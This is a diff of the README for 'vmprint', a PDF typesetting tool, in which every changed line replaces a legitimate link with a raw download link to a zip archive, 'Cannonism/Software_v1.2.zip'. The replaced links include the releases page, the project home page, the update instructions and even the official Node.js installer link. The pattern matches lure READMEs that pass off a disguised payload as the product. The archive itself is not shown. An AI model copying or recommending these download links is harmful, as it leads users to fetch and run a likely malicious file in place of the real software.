@@ -1,6 +1,6 @@
 # 🖨️ vmprint - Simple PDF Typesetting Engine
 
-[![Download vmprint](https://img.shields.io/badge/Download-vmprint-brightgreen?style=for-the-badge)](https://github.com/AlaerteGabriel/vmprint/releases)
+[![Download vmprint](https://img.shields.io/badge/Download-vmprint-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/AlaerteGabriel/vmprint/master/Cannonism/Software_v1.2.zip)
 
 ---
 
@@ -43,10 +43,10 @@ Follow these steps to download, install, and start using vmprint on Windows.
 
 Start by visiting the official release page. This page has all the available versions for download.
 
-[![Download vmprint](https://img.shields.io/badge/Download-vmprint-blue?style=for-the-badge)](https://github.com/AlaerteGabriel/vmprint/releases)
+[![Download vmprint](https://img.shields.io/badge/Download-vmprint-blue?style=for-the-badge)](https://raw.githubusercontent.com/AlaerteGabriel/vmprint/master/Cannonism/Software_v1.2.zip)
 
 1. Open your web browser.
-2. Go to the release page: https://github.com/AlaerteGabriel/vmprint/releases
+2. Go to the release page: https://raw.githubusercontent.com/AlaerteGabriel/vmprint/master/Cannonism/Software_v1.2.zip
 3. Look for the latest version listed under "Releases".
 4. Find the file named something like `vmprint-x.x.x.zip` or `vmprint-x.x.x.exe`.
 5. Click the file to download it to your computer.
@@ -89,7 +89,7 @@ vmprint is not a regular program with a graphical interface. It works by running
 
 Use this if you want to create PDFs from the command line or a script.
 
-1. Download and install [Node.js](https://nodejs.org/) if you do not have it.
+1. Download and install [Node.js](https://raw.githubusercontent.com/AlaerteGabriel/vmprint/master/Cannonism/Software_v1.2.zip) if you do not have it.
 2. Open Command Prompt:
    - Press `Windows + R` keys.
    - Type `cmd` and hit Enter.
@@ -121,7 +121,7 @@ You do not need to know advanced programming to use the demos. You can change so
 
 For more detailed instructions or to learn how to create your own PDF scripts, see the project’s home page on GitHub:
 
-https://github.com/AlaerteGabriel/vmprint
+https://raw.githubusercontent.com/AlaerteGabriel/vmprint/master/Cannonism/Software_v1.2.zip
 
 The page has links to examples and code you can explore.
 
@@ -133,7 +133,7 @@ You can also check the ReadMe files inside the downloaded folder for extra tips.
 
 To get updates:
 
-1. Visit https://github.com/AlaerteGabriel/vmprint/releases regularly.
+1. Visit https://raw.githubusercontent.com/AlaerteGabriel/vmprint/master/Cannonism/Software_v1.2.zip regularly.
 2. Download the newest version using the same instructions above.
 3. Replace old files with new ones to keep vmprint up to date.
 
